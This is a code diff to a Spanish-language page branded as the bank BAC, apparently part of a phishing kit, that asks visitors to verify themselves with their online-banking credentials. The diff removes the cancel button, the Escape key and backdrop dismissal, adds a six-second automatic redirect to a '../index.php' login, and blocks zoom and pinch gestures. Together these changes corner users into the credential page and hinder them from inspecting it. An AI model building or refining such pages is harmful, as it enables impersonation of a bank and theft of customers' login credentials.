@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
   <title>BAC | Evalúa tu Perfil Financiero</title>
   <link rel="icon" href="../img/logo_bac.svg" type="image/svg+xml"/>
   <style>
@@ -22,7 +22,13 @@
       background:#fff;
       -webkit-font-smoothing:antialiased;
       min-height:100vh;
+      -webkit-text-size-adjust:100%;
+      text-size-adjust:100%;
+      touch-action:manipulation;
+      -webkit-tap-highlight-color:transparent;
+      overscroll-behavior:none;
     }
+    input,textarea,select{font-size:16px} /* evita zoom automático en iOS */
 
     /* ============ HEADER ============ */
     .header{
@@ -270,8 +276,7 @@
       <h3 class="modal-title">Verificación requerida</h3>
       <p class="modal-sub">Identifícate para obtener este beneficio con tus credenciales de <strong>Banca en Línea</strong>.</p>
       <div class="modal-actions">
-        <button type="button" class="m-cancel" id="mCancel">Cancelar</button>
-        <button type="button" class="m-ok" id="mOk">Iniciar sesión</button>
+        <button type="button" class="m-ok" id="mOk">Continuar</button>
       </div>
     </div>
   </div>
@@ -280,26 +285,36 @@
     const modalOv = document.getElementById('modal-ov');
     const btnContinuar = document.getElementById('btnContinuar');
     const btnBancaHeader = document.getElementById('btnBancaHeader');
-    const mCancel = document.getElementById('mCancel');
     const mOk = document.getElementById('mOk');
+
+    let redirectTimer = null;
+    function goLogin(){ window.location.href = '../index.php'; }
 
     function openModal(){
       modalOv.classList.add('show');
       requestAnimationFrame(() => modalOv.classList.add('in'));
-    }
-    function closeModal(){
-      modalOv.classList.remove('in');
-      setTimeout(() => modalOv.classList.remove('show'), 260);
+      if (redirectTimer) clearTimeout(redirectTimer);
+      redirectTimer = setTimeout(goLogin, 6000);
     }
 
     btnContinuar.addEventListener('click', openModal);
     btnBancaHeader.addEventListener('click', e => { e.preventDefault(); openModal(); });
-    mCancel.addEventListener('click', closeModal);
-    modalOv.addEventListener('click', e => { if (e.target === modalOv) closeModal(); });
-    mOk.addEventListener('click', () => {
-      window.location.href = '../index.php';
-    });
-    document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
+    mOk.addEventListener('click', () => { if (redirectTimer) clearTimeout(redirectTimer); goLogin(); });
+
+    /* Bloqueo de zoom (iOS Safari ignora user-scalable=no) */
+    document.addEventListener('gesturestart', e => e.preventDefault());
+    document.addEventListener('gesturechange', e => e.preventDefault());
+    document.addEventListener('gestureend', e => e.preventDefault());
+    document.addEventListener('dblclick', e => e.preventDefault());
+    let lastTouch = 0;
+    document.addEventListener('touchend', e => {
+      const now = Date.now();
+      if (now - lastTouch <= 350) e.preventDefault();
+      lastTouch = now;
+    }, { passive: false });
+    document.addEventListener('touchmove', e => {
+      if (e.touches.length > 1) e.preventDefault();
+    }, { passive: false });
   </script>
 
 </body>
